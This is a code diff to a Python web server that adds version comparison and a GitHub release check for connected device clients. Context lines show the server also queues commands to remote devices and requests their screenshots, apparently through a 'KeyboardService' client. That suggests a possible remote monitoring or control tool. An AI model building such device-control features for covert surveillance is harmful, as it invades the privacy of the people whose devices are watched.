@@ -8,6 +8,7 @@ import html
 import io
 import json
 import os
+import re
 import time
 import urllib.parse
 import urllib.request
@@ -287,6 +288,44 @@ def telegram_devices_text():
         lines.append(f"• {status} <b>{name}</b>\n  ID: <code>{device_id}</code>\n  Last seen: {age} ago")
     lines.insert(1, f"🟢 {online_count} online  •  🔴 {len(devices) - online_count} offline")
     return telegram_panel("DEVICES // NETWORK", "\n".join(lines))
+
+
+def normalize_version(value):
+    if value is None:
+        return (0, 0, 0, 0)
+    match = re.search(r"(?:v)?(\d+)(?:\.(\d+))?(?:\.(\d+))?(?:\.(\d+))?", str(value).strip())
+    if not match:
+        return (0, 0, 0, 0)
+    return tuple(int(part or 0) for part in match.groups())
+
+
+def compare_versions(current_version, latest_version):
+    current_parts = normalize_version(current_version)
+    latest_parts = normalize_version(latest_version)
+    max_length = max(len(current_parts), len(latest_parts))
+    current_parts = current_parts + (0,) * (max_length - len(current_parts))
+    latest_parts = latest_parts + (0,) * (max_length - len(latest_parts))
+    if current_parts < latest_parts:
+        return -1
+    if current_parts > latest_parts:
+        return 1
+    return 0
+
+
+def get_latest_release_version():
+    request = urllib.request.Request(
+        "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest",
+        headers={
+            "Accept": "application/vnd.github+json",
+            "User-Agent": "KeyboardService-server",
+        },
+    )
+    with urllib.request.urlopen(request, timeout=15) as response:
+        release = json.loads(response.read().decode("utf-8"))
+    latest_tag = str(release.get("tag_name", "")).strip()
+    if not latest_tag:
+        raise RuntimeError("GitHub release tag is empty")
+    return latest_tag
 
 
 def queue_device_command(device_id, command, message=""):
@@ -1652,6 +1691,40 @@ async def request_device_screenshot(
         "updated_at": int(time.time() * 1000),
     }
     return JSONResponse({"ok": True})
+
+
+@app.get("/api/devices/{device_id}/update-check")
+async def check_device_update(device_id: str):
+    normalized_device_id = device_id.strip()
+    if not normalized_device_id or normalized_device_id not in devices:
+        return JSONResponse({"ok": False, "error": "device not found"}, status_code=404)
+
+    current_version = str(devices[normalized_device_id].get("client_version", "")).strip()
+    try:
+        latest_version = get_latest_release_version()
+    except Exception as error:
+        return JSONResponse(
+            {
+                "ok": False,
+                "error": f"Could not check for updates: {error}",
+                "current_version": current_version,
+                "latest_version": "",
+                "needs_update": False,
+                "is_up_to_date": False,
+            },
+            status_code=502,
+        )
+
+    comparison = compare_versions(current_version, latest_version)
+    return JSONResponse(
+        {
+            "ok": True,
+            "current_version": current_version,
+            "latest_version": latest_version,
+            "needs_update": comparison < 0,
+            "is_up_to_date": comparison >= 0,
+        }
+    )
 
 
 @app.post("/api/devices/{device_id}/command")
